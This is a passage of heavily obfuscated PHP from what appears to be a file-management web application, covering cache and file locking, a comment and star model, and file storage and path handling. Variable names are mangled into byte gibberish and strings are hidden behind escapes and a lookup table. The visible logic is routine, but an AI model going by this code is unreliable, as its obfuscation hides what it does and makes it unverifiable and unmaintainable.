(is_string(self::$errorMsg) && self::$errorMsg) { $Š°ö‹â¦ = $Š°ö‹â¦ . $í’¤óüş[919] . self::$errorMsg; } write_log($í’¤óüş[920] . sprintf($í’¤óüş[921], timeFloat() - $¯ ş¡Şì) . $í’¤óüş[922] . $±˜™ˆ± . $í’¤óüş[923] . error_get_last(), $í’¤óüş[914]); show_json($Š°ö‹â¦, !1); } if (!$’ÏâïŒò) { self::$lockItem[$ùúÇû ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $µËúš = number_format(timeFloat() - $ÓµæÈÀ…, 3); write_log($í’¤óüş[924] . $Ş¬ùšŞš . $í’¤óüş[925] . $µËúš, $í’¤óüş[914]); } return $‰Ü´Õã“; } public static function lockGet($õæçüÅà) { $·…ÓÈ„Ì = self::key($õæçüÅà); if (self::$lockItem[$·…ÓÈ„Ì]) { return self::$lockItem[$·…ÓÈ„Ì]; } return self::init()->lockGet($·…ÓÈ„Ì); } public static function unlock($áÅƒ¬—) { $…×Éİ—´ =& $_SERVER[¢ñàß¿€]; $¤æ‚£® = self::key($áÅƒ¬—); self::$lockItem[$¤æ‚£®] = null; self::init()->unlock($¤æ‚£®); if (GLOBAL_DEBUG_LOG_ALL) { write_log($…×Éİ—´[926] . $áÅƒ¬—, $…×Éİ—´[914]); } return; } public static function unlockRuntime() { $‡ã—ä°Á =& $_SERVER[¢ñàß¿€]; $ÀÎ«Îå = self::init(); $ó²Ïàû˜ = !1; foreach (self::$lockItem as $˜ĞÌ°÷è => $¢é‘Ö†ı) { if (!$¢é‘Ö†ı) { continue; } $ÀÎ«Îå->unlock($˜ĞÌ°÷è); if (!$ó²Ïàû˜) { $ó²Ïàû˜ = !0; write_log($‡ã—ä°Á[927] . $˜ĞÌ°÷è . $‡ã—ä°Á[74] . get_caller_msg(), $‡ã—ä°Á[914]); continue; } write_log($‡ã—ä°Á[927] . $˜ĞÌ°÷è, $‡ã—ä°Á[914]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Æà¸¬˜‹ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‡ã—ä°Á[928] . $Æà¸¬˜‹ . $‡ã—ä°Á[929] . ACTION, $‡ã—ä°Á[914]); } } public static function fileLock($É¢Âˆû) { $ÒëªĞ”§ =& $_SERVER[¢ñàß¿€]; if (!$GLOBALS[$ÒëªĞ”§[930]]) { $GLOBALS[$ÒëªĞ”§[930]] = array(); } $GLOBALS[$ÒëªĞ”§[930]][$É¢Âˆû] = !1; $ÑúıÀ¾Ë = fopen(DATA_PATH . $É¢Âˆû . $ÒëªĞ”§[931], $ÒëªĞ”§[932]); if (!$ÑúıÀ¾Ë) { return !1; } $GLOBALS[$ÒëªĞ”§[930]][$É¢Âˆû] = $ÑúıÀ¾Ë; if (flock($ÑúıÀ¾Ë, LOCK_EX)) { return !0; } self::unlock($É¢Âˆû); show_json($ÒëªĞ”§[933], !1); return !1; } public static function fileUnlock($†œ£¸µõ) { $šŠ•¥— =& $_SERVER[¢ñàß¿€]; $¹€ë­í = $GLOBALS[$šŠ•¥—[930]][$†œ£¸µõ]; if (!$¹€ë­í) { return; } $GLOBALS[$šŠ•¥—[930]][$†œ£¸µõ] = !1; flock($¹€ë­í, LOCK_UN); fclose($¹€ë­í); } public static function fileUnlockAll() { $¾‘ÙùÚş =& $_SERVER[¢ñàß¿€]; if (!isset($GLOBALS[$¾‘ÙùÚş[930]]) || !$GLOBALS[$¾‘ÙùÚş[930]]) { return; } foreach ($GLOBALS[$¾‘ÙùÚş[930]] as $“Éì×Øú => $¯äÁÛô) { if (!$¯äÁÛô) { continue; } $GLOBALS[$¾‘ÙùÚş[930]][$“Éì×Øú] = !1; flock($¯äÁÛô, LOCK_UN); fclose($¯äÁÛô); } $GLOBALS[$¾‘ÙùÚş[930]] = array(); } } goto CÔÍÁøöí³; B†òÅÖ«¶”: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\x6d\145" => "\x63\157\155\155\145\x6e\164\x5f\x6d\145\x74\141", "\x6d\x65\164\x61\x46\x69\x65\x6c\x64" => "\143\157\x6d\x6d\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($£ôüßï“) { $Ğñ××”¶ =& $_SERVER[¢ñàß¿€]; if ($£ôüßï“[$Ğñ××”¶[1997]]) { $Œ­Ô†¹Ù = $this->where(array($Ğñ××”¶[1998] => $£ôüßï“[$Ğñ××”¶[1997]]))->find(); if (!$Œ­Ô†¹Ù || $Œ­Ô†¹Ù[$Ğñ××”¶[190]] != $£ôüßï“[$Ğñ××”¶[190]] || $Œ­Ô†¹Ù[$Ğñ××”¶[569]] != $£ôüßï“[$Ğñ××”¶[569]]) { return !1; } $this->where(array($Ğñ××”¶[1998] => $£ôüßï“[$Ğñ××”¶[1997]]))->setAdd($Ğñ××”¶[1999], 1); } $£ôüßï“[$Ğñ××”¶[2000]] = 0; $£ôüßï“[$Ğñ××”¶[1999]] = 0; $£ôüßï“[$Ğñ××”¶[821]] = 1; return $this->add($£ôüßï“); } public function commentCount($Í°¼Ë‹Ê, $‘ƒ€¥ª­, $İáà„Ùß = false) { $¯¤³¡çŠ =& $_SERVER[¢ñàß¿€]; if (!$Í°¼Ë‹Ê) { return array(); } if (is_string($Í°¼Ë‹Ê) || is_int($Í°¼Ë‹Ê)) { $Í°¼Ë‹Ê = array($Í°¼Ë‹Ê); } $´€¤ÅÏ = array($¯¤³¡çŠ[569], $¯¤³¡çŠ[2001] => $¯¤³¡çŠ[565]); $¢¯¥¾Õç = array($¯¤³¡çŠ[569] => array($¯¤³¡çŠ[7], $Í°¼Ë‹Ê), $¯¤³¡çŠ[190] => $‘ƒ€¥ª­); if ($İáà„Ùß) { $¢¯¥¾Õç[$¯¤³¡çŠ[1770]] = $İáà„Ùß; } $ÃÌáƒ—À = $this->field($´€¤ÅÏ)->where($¢¯¥¾Õç)->group($¯¤³¡çŠ[569])->select(); return array_to_keyvalue($ÃÌáƒ—À, $¯¤³¡çŠ[569], $¯¤³¡çŠ[565]); } public function starTarget($­–‰°É, $¿¯ÉºŒó) { $¢ÇŒóÖ¶ =& $_SERVER[¢ñàß¿€]; $ŠåŒ›á = $­–‰°É + self::TYPE_STAR_OFFSET; $·´„˜£ = array($¢ÇŒóÖ¶[1770] => USER_ID, $¢ÇŒóÖ¶[190] => $ŠåŒ›á, $¢ÇŒóÖ¶[569] => $¿¯ÉºŒó); $İıºÒÉÅ = $this->where($·´„˜£)->find(); if ($İıºÒÉÅ) { return $this->where(array($¢ÇŒóÖ¶[475] => $İıºÒÉÅ[$¢ÇŒóÖ¶[475]]))->delete(); } $âç”³Òì = array($¢ÇŒóÖ¶[1997] => 0, $¢ÇŒóÖ¶[1770] => USER_ID, $¢ÇŒóÖ¶[821] => 1, $¢ÇŒóÖ¶[171] => $¢ÇŒóÖ¶[12], $¢ÇŒóÖ¶[190] => $ŠåŒ›á, $¢ÇŒóÖ¶[569] => $¿¯ÉºŒó, $¢ÇŒóÖ¶[2000] => 0, $¢ÇŒóÖ¶[1999] => 0); return $this->add($âç”³Òì); } public function starTargetCount($ÒµòÑì, $ŸÎ¼¦) { $×öÛß·Ç =& $_SERVER[¢ñàß¿€]; $õ¦“Ç³¬ = $ŸÎ¼¦ + self::TYPE_STAR_OFFSET; $ªÍ§êÏ¢ = $this->commentCount($ÒµòÑì, $õ¦“Ç³¬); $íùâ·‹ï = $this->commentCount($ÒµòÑì, $õ¦“Ç³¬, USER_ID); return array($×öÛß·Ç[2002] => $ªÍ§êÏ¢, $×öÛß·Ç[2003] => $íùâ·‹ï); } public function starTargetUserList($œáóäÄÔ, $Á¿òÎãº) { $ÕÑÆ¼ =& $_SERVER[¢ñàß¿€]; $ğ±ìËÈ« = $œáóäÄÔ + self::TYPE_STAR_OFFSET; $Ñğ»¸Ôª = array($ÕÑÆ¼[569] => $Á¿òÎãº, $ÕÑÆ¼[190] => $ğ±ìËÈ«); $Â¡ŒìŒ = $this->where($Ñğ»¸Ôª)->count(); $êĞô‘“² = array($ÕÑÆ¼[332] => $Â¡ŒìŒ, $ÕÑÆ¼[2004] => array()); if (!$Â¡ŒìŒ) { return $êĞô‘“²; } $ã¢Ã­ïñ = $this->field($ÕÑÆ¼[1770])->where($Ñğ»¸Ôª)->limit(500)->select(); $ã¢Ã­ïñ = array_to_keyvalue($ã¢Ã­ïñ, $ÕÑÆ¼[12], $ÕÑÆ¼[1770]); $êĞô‘“²[$ÕÑÆ¼[2004]] = Model($ÕÑÆ¼[577])->userListInfo($ã¢Ã­ïñ); return $êĞô‘“²; } public function prasiseUserList($êÖø·Ãô) { $Í»˜áşÚ =& $_SERVER[¢ñàß¿€]; $ãìæ¬ë = array($Í»˜áşÚ[2005] => $êÖø·Ãô); $â¯Îàåı = $this->where($ãìæ¬ë)->find(); $ÒÁõğşì = _get($â¯Îàåı, $Í»˜áşÚ[2000], 0); $¯ºËÁ© = array($Í»˜áşÚ[332] => $ÒÁõğşì, $Í»˜áşÚ[2004] => array()); if (!$ÒÁõğşì) { return $¯ºËÁ©; } $Û³‰¢¤Ù = Model($Í»˜áşÚ[2006])->field($Í»˜áşÚ[1770])->where($ãìæ¬ë)->limit(500)->select(); $Û³‰¢¤Ù = array_to_keyvalue($Û³‰¢¤Ù, $Í»˜áşÚ[12], $Í»˜áşÚ[1770]); $¯ºËÁ©[$Í»˜áşÚ[2004]] = Model($Í»˜áşÚ[577])->userListInfo($Û³‰¢¤Ù); return $¯ºËÁ©; } public function remove($Ü÷“£İñ) { $ƒÇáŞá³ =& $_SERVER[¢ñàß¿€]; $İ—––Ä = array($ƒÇáŞá³[1998] => $Ü÷“£İñ); $·õôÕ’ = $this->where($İ—––Ä)->find(); if ($·õôÕ’[$ƒÇáŞá³[1997]]) { $this->where(array($ƒÇáŞá³[1998] => $·õôÕ’[$ƒÇáŞá³[1997]]))->setAdd($ƒÇáŞá³[1999], -1); } return $this->where($İ—––Ä)->delete(); } public function edit($ôÛ¦Ø¢ò, $ô¼•Óƒ) { $Ç”¶åâ“ =& $_SERVER[¢ñàß¿€]; $ŸÏ¹™ÂÄ = array($Ç”¶åâ“[1998] => $ôÛ¦Ø¢ò); return $this->where($ŸÏ¹™ÂÄ)->save(array($Ç”¶åâ“[2007] => $ô¼•Óƒ)); } public function prasise($ıÙÓÄî¦) { $û¹Åà¿ =& $_SERVER[¢ñàß¿€]; $”õıªÜÁ = Model($û¹Åà¿[2008]); $ıÀ±ˆÉ¿ = array($û¹Åà¿[1998] => $ıÙÓÄî¦, $û¹Åà¿[1761] => USER_ID); $‹…üÃ˜Ã = $”õıªÜÁ->where($ıÀ±ˆÉ¿)->find(); if (!$‹…üÃ˜Ã) { $”õıªÜÁ->add($ıÀ±ˆÉ¿); $¸ç–¢² = $this->where(array($û¹Åà¿[1998] => $ıÙÓÄî¦))->setAdd($û¹Åà¿[2000], 1); } else { $”õıªÜÁ->where($ıÀ±ˆÉ¿)->delete(); $¸ç–¢² = $this->where(array($û¹Åà¿[1998] => $ıÙÓÄî¦))->setAdd($û¹Åà¿[2000], -1); } return $¸ç–¢²; } public function targetInfo($ı¿ÊÌ‰ , $öÆõü×Ş) { $›§ŞĞÑà =& $_SERVER[¢ñàß¿€]; $Ó¸Ê†Œ° = array($›§ŞĞÑà[648] => $ı¿ÊÌ‰ , $›§ŞĞÑà[649] => $öÆõü×Ş); $Ğâò ‰ = $this->where($Ó¸Ê†Œ°)->count(); $ğçáâò¢ = "\x52\x49\x47\x48\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\143\157\155\155\145\x6e\x74\x5f\x70\162\x61\151\x73\x65\40\163\x74\141\x72\40\x6f\156\x20\x63\x6f\155\155\x65\x6e\x74\x2e\143\x6f\x6d\x6d\x65\156\164\x49\104\x20\75\40\163\x74\141\x72\56\x63\157\155\155\145\x6e\x74\x49\104"; $º‚ø´ïÇ = $this->alias($›§ŞĞÑà[430])->where($Ó¸Ê†Œ°)->join($ğçáâò¢, $›§ŞĞÑà[2009])->count(); $‡Äš‰çë = array($›§ŞĞÑà[2010] => $Ğâò ‰, $›§ŞĞÑà[2011] => $º‚ø´ïÇ); return $‡Äš‰çë; } public function listData($Øù¼¨æÒ) { $¼¡öãÔÓ =& $_SERVER[¢ñàß¿€]; if (isset($Øù¼¨æÒ[$¼¡öãÔÓ[2012]])) { if ($Øù¼¨æÒ[$¼¡öãÔÓ[2012]]) { $Øù¼¨æÒ[$¼¡öãÔÓ[2005]] = array($¼¡öãÔÓ[1089], intval($Øù¼¨æÒ[$¼¡öãÔÓ[2012]])); } unset($Øù¼¨æÒ[$¼¡öãÔÓ[2012]]); } if (isset($Øù¼¨æÒ[$¼¡öãÔÓ[2013]])) { if ($Øù¼¨æÒ[$¼¡öãÔÓ[2013]]) { $Øù¼¨æÒ[$¼¡öãÔÓ[2005]] = array($¼¡öãÔÓ[1086], intval($Øù¼¨æÒ[$¼¡öãÔÓ[2013]])); } unset($Øù¼¨æÒ[$¼¡öãÔÓ[2013]]); } return $this->_listData($Øù¼¨æÒ); } private function _listData($ĞíÊı·) { $“›Æ¸ğ =& $_SERVER[¢ñàß¿€]; $•Œ©¾ = $this->where($ĞíÊı·)->_makeOrder()->selectPage(100); $this->_listAppendParent($•Œ©¾[$“›Æ¸ğ[445]]); $this->_listAppendUser($•Œ©¾[$“›Æ¸ğ[445]]); $this->_listAppendMeta($•Œ©¾[$“›Æ¸ğ[445]]); return $•Œ©¾; } private function _makeOrder() { $ÍŒƒ§Êº =& $_SERVER[¢ñàß¿€]; $æì­£ŸÙ = array($ÍŒƒ§Êº[2000], $ÍŒƒ§Êº[1999], $ÍŒƒ§Êº[231]); $ãÜÔœ›ñ = Input::get($ÍŒƒ§Êº[530], $ÍŒƒ§Êº[7], $ÍŒƒ§Êº[497], $æì­£ŸÙ); $Ë²È‘·Â = Input::get($ÍŒƒ§Êº[531], $ÍŒƒ§Êº[7], $ÍŒƒ§Êº[1763], array($ÍŒƒ§Êº[2014], $ÍŒƒ§Êº[526])); $’Ñıô³¶ = $ãÜÔœ›ñ . $ÍŒƒ§Êº[53] . $Ë²È‘·Â; return $this->order($’Ñıô³¶); } private function _listAppendParent(&$Ãš‹¦Î÷) { $Íï¡ğ°Œ =& $_SERVER[¢ñàß¿€]; $‹†Ì‡§ä = array_unique(array_to_keyvalue($Ãš‹¦Î÷, $Íï¡ğ°Œ[12], $Íï¡ğ°Œ[1997])); $‹†Ì‡§ä = array_remove_value($‹†Ì‡§ä, $Íï¡ğ°Œ[228]); if (!$‹†Ì‡§ä) { return; } $‹¡ëÑŠÃ = $this->where(array($Íï¡ğ°Œ[1998] => array($Íï¡ğ°Œ[7], $‹†Ì‡§ä)))->select(); $‹¡ëÑŠÃ = array_to_keyvalue($‹¡ëÑŠÃ, $Íï¡ğ°Œ[2005]); foreach ($Ãš‹¦Î÷ as &$ª·İÜ°½) { if (isset($‹¡ëÑŠÃ[$ª·İÜ°½[$Íï¡ğ°Œ[1997]]])) { $ª·İÜ°½[$Íï¡ğ°Œ[2015]] = $‹¡ëÑŠÃ[$ª·İÜ°½[$Íï¡ğ°Œ[1997]]]; } } unset($ª·İÜ°½); } private function _listAppendUser(&$ÑÖ€§Â¿) { $ø¼’çÚ =& $_SERVER[¢ñàß¿€]; $·˜ÂñÚ³ = array_unique(array_to_keyvalue($ÑÖ€§Â¿, $ø¼’çÚ[12], $ø¼’çÚ[1770])); $·˜ÂñÚ³ = array_remove_value($·˜ÂñÚ³, $ø¼’çÚ[228]); if (count($·˜ÂñÚ³) == 0) { return; } foreach ($ÑÖ€§Â¿ as $Şê³é¼´) { if (isset($Şê³é¼´[$ø¼’çÚ[2015]])) { $·˜ÂñÚ³[] = $Şê³é¼´[$ø¼’çÚ[2015]][$ø¼’çÚ[1770]]; } } $ôŞäµÖ· = Model($ø¼’çÚ[598])->userListInfo($·˜ÂñÚ³); foreach ($ÑÖ€§Â¿ as &$Şê³é¼´) { $Şê³é¼´[$ø¼’çÚ[662]] = $ôŞäµÖ·[$Şê³é¼´[$ø¼’çÚ[1770]]]; if (isset($Şê³é¼´[$ø¼’çÚ[2015]])) { $Şê³é¼´[$ø¼’çÚ[2015]][$ø¼’çÚ[662]] = $ôŞäµÖ·[$Şê³é¼´[$ø¼’çÚ[2015]][$ø¼’çÚ[1770]]]; } } unset($Şê³é¼´); } private function _listAppendMeta(&$æùãÔ¡) { $àÏàŒÑ… =& $_SERVER[¢ñàß¿€]; $Òğè«• = array_unique(array_to_keyvalue($æùãÔ¡, $àÏàŒÑ…[12], $àÏàŒÑ…[2005])); $Òğè«• = array_remove_value($Òğè«•, $àÏàŒÑ…[228]); if (!$Òğè«•) { return; } foreach ($æùãÔ¡ as $Ğœ’¯óÆ) { if (isset($Ğœ’¯óÆ[$àÏàŒÑ…[2015]])) { $Òğè«•[] = $Ğœ’¯óÆ[$àÏàŒÑ…[2015]][$àÏàŒÑ…[2005]]; } } $Ã‹ñ¦ğŠ = $this->metaList($Òğè«•); if (!$Ã‹ñ¦ğŠ) { return !1; } foreach ($æùãÔ¡ as &$Ğœ’¯óÆ) { $Ğœ’¯óÆ[$àÏàŒÑ…[539]] = $Ã‹ñ¦ğŠ[$Ğœ’¯óÆ[$àÏàŒÑ…[2005]]]; if (isset($Ğœ’¯óÆ[$àÏàŒÑ…[2015]])) { $Ğœ’¯óÆ[$àÏàŒÑ…[2015]][$àÏàŒÑ…[539]] = $Ã‹ñ¦ğŠ[$Ğœ’¯óÆ[$àÏàŒÑ…[2015]][$àÏàŒÑ…[2005]]]; } } unset($Ğœ’¯óÆ); } private function metaList($Ä¹ºÊ½) { $á™ƒšÄñ =& $_SERVER[¢ñàß¿€]; if (!$Ä¹ºÊ½) { return array(); } $‘×û’™Ï = array($á™ƒšÄñ[2005] => array($á™ƒšÄñ[7], $Ä¹ºÊ½)); $÷­“ÃÈ» = Model($á™ƒšÄñ[2016])->where($‘×û’™Ï)->select(); $÷­“ÃÈ» = array_to_keyvalue_group($÷­“ÃÈ», $á™ƒšÄñ[2005]); foreach ($÷­“ÃÈ» as $ıºğäƒ => $ìÒú×) { $°¸Î‚²Ü = array(); foreach ($ìÒú× as $ñãÉÏ³Ñ) { $°¸Î‚²Ü[$ñãÉÏ³Ñ[$á™ƒšÄñ[97]]] = $ñãÉÏ³Ñ[$á™ƒšÄñ[450]]; } $÷­“ÃÈ»[$ıºğäƒ] = $°¸Î‚²Ü; } return $÷­“ÃÈ» ? $÷­“ÃÈ» : array(); } public function removeTarget($¢ßëèŞ, $ÑšƒÔÏ) { $âŞŸÙÂÕ =& $_SERVER[¢ñàß¿€]; if (!$ÑšƒÔÏ) { return !0; } $ÑšƒÔÏ = is_array($ÑšƒÔÏ) ? $ÑšƒÔÏ : array($ÑšƒÔÏ); $Â£°Û¯ä = array($âŞŸÙÂÕ[190] => $¢ßëèŞ, $âŞŸÙÂÕ[569] => array($âŞŸÙÂÕ[7], $ÑšƒÔÏ)); $Š»Ú–Š = $this->field($âŞŸÙÂÕ[2005])->where($Â£°Û¯ä)->select(); $º¥¸—œ« = array_to_keyvalue($Š»Ú–Š, $âŞŸÙÂÕ[12], $âŞŸÙÂÕ[2005]); if (!$º¥¸—œ«) { return !0; } $Â£°Û¯ä = array($âŞŸÙÂÕ[2005] => array($âŞŸÙÂÕ[7], $º¥¸—œ«)); $this->where($Â£°Û¯ä)->delete(); Model($âŞŸÙÂÕ[2008])->where($Â£°Û¯ä)->delete(); Model($âŞŸÙÂÕ[2017])->where($Â£°Û¯ä)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\154\145\137\x63\157\x6e\x74\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\x73\145\x72\164", "\x66\165\156\143\164\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\154\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\155\x65" => "\x69\x6f\x5f\x66\x69\x6c\x65\x5f\155\x65\164\141", "\x6d\145\164\141\x46\151\x65\154\144" => "\146\x69\x6c\145\x49\x44"); public function fileInfo($¤™‘ç•) { $İ†åª¥ =& $_SERVER[¢ñàß¿€]; static $›Æ°«Ãç = array(); if (!isset($›Æ°«Ãç[$¤™‘ç•])) { $ƒ–çÒŒâ = $İ†åª¥[2018]; $‚–±½Ññ = Model($İ†åª¥[544])->field($ƒ–çÒŒâ)->where(array($İ†åª¥[542] => $¤™‘ç•))->find(); $›Æ°«Ãç[$¤™‘ç•] = $‚–±½Ññ; } return $›Æ°«Ãç[$¤™‘ç•]; } public function addFileByContent($àÁ¦Šıù = '', $¹¤†öÌ = '') { $–Â¿ôçı =& $_SERVER[¢ñàß¿€]; $ã·ìº•‡ = TEMP_PATH . $–Â¿ôçı[2019]; if (!is_dir($ã·ìº•‡)) { mk_dir($ã·ìº•‡); } $ÎËòÑ‰÷ = $ã·ìº•‡ . $–Â¿ôçı[2020] . rand_string(16); file_put_contents($ÎËòÑ‰÷, $àÁ¦Šıù); $½èİµöö = $this->addFile($ÎËòÑ‰÷, $¹¤†öÌ, !0); if (file_exists($ÎËòÑ‰÷)) { @unlink($ÎËòÑ‰÷); } return $½èİµöö; } public function createFileName($ö££ïóë, $ıùáï‚õ = false, $«æ£şç‚ = false) { $ê†º¸€‡ =& $_SERVER[¢ñàß¿€]; $Ê²Š¹é¹ = IO::init($ê†º¸€‡[8]); $Î»³‚Í = $this->makeFilePath($ö££ïóë, $Ê²Š¹é¹, $ıùáï‚õ, $«æ£şç‚); $Æª¦£–î = $Ê²Š¹é¹->pathFather($Î»³‚Í); static $˜Ç«¬ƒÔ = false; $ÎÔü²ú  = $ê†º¸€‡[2021] . md5($Æª¦£–î); if (!$˜Ç«¬ƒÔ && !Cache::get($ÎÔü²ú )) { $˜Ç«¬ƒÔ = !0; $ÄÇßâ‘ = IO::mkdir($Æª¦£–î); if (!IO::exist($ÄÇßâ‘ . $ê†º¸€‡[868])) { IO::mkfile($ÄÇßâ‘ . $ê†º¸€‡[868]); } Cache::set($ÎÔü²ú , 1, 3600 * 2); } return $Î»³‚Í; } public function makeFilePath($Á¸Â½, $ÌôÓÅ§Œ, $ñıÅÊ‘” = false, $çÓì”Ç = false) { $ˆıè†ñ =& $_SERVER[¢ñàß¿€]; $ó¶²†¹ö = Model($ˆıè†ñ[841])->get($ˆıè†ñ[2022]); $ßÊÜÑÉ‘ = KodIO::defaultIO() . date($ˆıè†ñ[2023]); $î®êí¬ = $ßÊÜÑÉ‘ . rand_string(5) . short_id(100); $Á¸Â½ = str_replace($ˆıè†ñ[8], $ˆıè†ñ[11], KodIO::clear($Á¸Â½)); $“üÆø¾– = $ÌôÓÅ§Œ->ext($Á¸Â½); if (!$Á¸Â½) { $ó¶²†¹ö = $ˆıè†ñ[847]; } switch ($ó¶²†¹ö) { case $ˆıè†ñ[2024]: if ($“üÆø¾–) { $î®êí¬ = $î®êí¬ . $ˆıè†ñ[10] . $“üÆø¾–; } if ($“üÆø¾– == $ˆıè†ñ[1961]) { $î®êí¬ .= $ˆıè†ñ[1288]; } break; case $ˆıè†ñ[2025]: $ŸšÕé“Ù = Model($ˆıè†ñ[841])->get($ˆıè†ñ[842]); $ÙéÜŞ = substr(md5($ˆıè†ñ[843] . $ŸšÕé“Ù . date($ˆıè†ñ[820])), 0, 8); $Ë´¼Á³‘ = KodIO::defaultDriver(); $ßÊÜÑÉ‘ = $ˆıè†ñ[1319] . $Ë´¼Á³‘[$ˆıè†ñ[475]] . $ˆıè†ñ[484] . date($ˆıè†ñ[2026]) . $ÙéÜŞ . $ˆıè†ñ[8]; if ($“üÆø¾– == $ˆıè†ñ[1961]) { $Á¸Â½ .= $ˆıè†ñ[1288]; } $’™¸âÈÀ = $ˆıè†ñ[2027] . $ßÊÜÑÉ‘ . $Á¸Â½; CacheLock::lock($’™¸âÈÀ); $î®êí¬ = $ßÊÜÑÉ‘ . $Á¸Â½; if (IO::exist($ßÊÜÑÉ‘ . $Á¸Â½)) { $°×ëµá» = substr($Á¸Â½, 0, strlen($Á¸Â½) - strlen($“üÆø¾–)); $óÔ¬Ô½ = $çÓì”Ç ? substr($çÓì”Ç, 0, 5) : ($ñıÅÊ‘” ? substr($ñıÅÊ‘”, 0, 5) : rand_string(5)); $î®êí¬ = $ßÊÜÑÉ‘ . $°×ëµá» . $óÔ¬Ô½; if ($“üÆø¾–) { $î®êí¬ = $î®êí¬ . $ˆıè†ñ[10] . $“üÆø¾–; } } if (IO::isOsDriver($î®êí¬) && !IO::isUploadServer($î®êí¬)) { if (IO::exist($î®êí¬)) { return $î®êí¬; } $Ä÷Ûõ”½ = IO::setContent($î®êí¬, $ˆıè†ñ[12]); if (!$Ä÷Ûõ”½) { show_json($ˆıè†ñ[2028], !1); } } CacheLock::unlock($’™¸âÈÀ); break; case $ˆıè†ñ[847]: break; default: break; } return $î®êí¬; } public function addFileByRemote($ŸèÀºïæ, $à³ˆšÑ±, $Ñ‚Ö¹ŒË = array()) { $ûÆôÈÖ =& $_SERVER[¢ñàß¿€]; if (!IO::exist($ŸèÀºïæ)) { return !1; } $ÀÍÚÁ­ = $Ñ‚Ö¹ŒË[$ûÆôÈÖ[547]] ? $Ñ‚Ö¹ŒË[$ûÆôÈÖ[547]] : $ûÆôÈÖ[12]; $ØÁÏÁ‚• = IO::hashMd5($ŸèÀºïæ, $ÀÍÚÁ­); $ÎãŞÅ = KodIO::defaultDriver(); $«‹ƒ¬Ñ³ = array($ûÆôÈÖ[617] => IO::size($ŸèÀºïæ), $ûÆôÈÖ[2029] => 1, $ûÆôÈÖ[494] => $à³ˆšÑ±, $ûÆôÈÖ[879] => $ÎãŞÅ[$ûÆôÈÖ[475]], $ûÆôÈÖ[495] => $ŸèÀºïæ, $ûÆôÈÖ[2030] => $Ñ‚Ö¹ŒË[$ûÆôÈÖ[672]] ? $Ñ‚Ö¹ŒË[$ûÆôÈÖ[672]] : IO::hashSimple($ŸèÀºïæ), $ûÆôÈÖ[2031] => $ØÁÏÁ‚• ? $ØÁÏÁ‚• : $ÀÍÚÁ­); if ($¯É€Ú­ = $this->addFileCheckExist($«‹ƒ¬Ñ³[$ûÆôÈÖ[672]], $«‹ƒ¬Ñ³[$ûÆôÈÖ[547]], $«‹ƒ¬Ñ³[$ûÆôÈÖ[79]])) { return $¯É€Ú­; } return $this->addFileData($«‹ƒ¬Ñ³); } private function addFileData($Ş°®„·ó) { $¿äøşêˆ =& $_SERVER[¢ñàß¿€]; if (!$Ş°®„·ó) { return !1; } $Ş°®„·ó[$¿äøşêˆ[79]] = intval($Ş°®„·ó[$¿äøşêˆ[79]]); if (!$Ş°®„·ó[$¿äøşêˆ[79]] && strlen($Ş°®„·ó[$¿äøşêˆ[672]]) > 32) { $Ş°®„·ó[$¿äøşêˆ[79]] = intval(substr($Ş°®„·ó[$¿äøşêˆ[672]], 32)); } $öóºŞ¸§ = $this->add($Ş°®„·ó); return $this->find($öóºŞ¸§); } public function addFile($ø…ÑÕ“±, $÷áªÄïØ, $µä¦Ò¾ª = false) { $—İŒ¯Å =& $_SERVER[¢ñàß¿€]; $€ĞàÎü = IO::hashSimple($ø…ÑÕ“±); $›èæ¯  = IO::size($ø…ÑÕ“±); $Óæä› = $›èæ¯  <= 1024 * 1024 * 10 ? IO::hashMd5($ø…ÑÕ“±) : $—İŒ¯Å[12]; $öŸ¡¤ÅÔ = $—İŒ¯Å[2032] . $€ĞàÎü; CacheLock::lock($öŸ¡¤ÅÔ); if ($Óæä› && $€ĞàÎü) { $†­ì¯“Á = $this->addFileCheckExist($€ĞàÎü, $Óæä›, $›èæ¯ ); if ($†­ì¯“Á) { CacheLock::unlock($öŸ¡¤ÅÔ); return $†­ì¯“Á; } } $äÍ‰şäÍ = $this->addFileMake($ø…ÑÕ“±, $›èæ¯ , $€ĞàÎü, $Óæä›, $÷áªÄïØ, $µä¦Ò¾ª); $ÉÃüé¸ú = $this->addFileData($äÍ‰şäÍ); CacheLock::unlock($öŸ¡¤ÅÔ); if (!$Óæä› && $ÉÃüé¸ú) { $this->fileMd5Check($ÉÃüé¸ú); } return $ÉÃüé¸ú; } public function fileMd5Check($ùàÇ¨Õ®) { $±È¬ŸÖš =& $_SERVER[¢ñàß¿€]; $½ÄœòÛî = array($ùàÇ¨Õ®[$±È¬ŸÖš[541]], $ùàÇ¨Õ®[$±È¬ŸÖš[87]]); $«­ØØò = $±È¬ŸÖš[2033] . $ùàÇ¨Õ®[$±È¬ŸÖš[87]]; $ô˜ÆšÉ = $±È¬ŸÖš[2034] . $ùàÇ¨Õ®[$±È¬ŸÖš[541]]; TaskQueue::add($±È¬ŸÖš[2035], $½ÄœòÛî, $«­ØØò, $ô˜ÆšÉ); } public function fileMd5Set($¯­ôÛşÂ, $õÄÅİîÜ) { $‡‡‚Ä¡ =& $_SERVER[¢ñàß¿€]; $íÜ·ù½ğ = $this->find($¯­ôÛşÂ); if (!$íÜ·ù½ğ || $íÜ·ù½ğ[$‡‡‚Ä¡[547]]) { return; } $Ù…™€‘ = IO::hashMd5($õÄÅİîÜ); if (!$Ù…™€‘) { return $‡‡‚Ä¡[12]; } $this->where(array($‡‡‚Ä¡[541] => 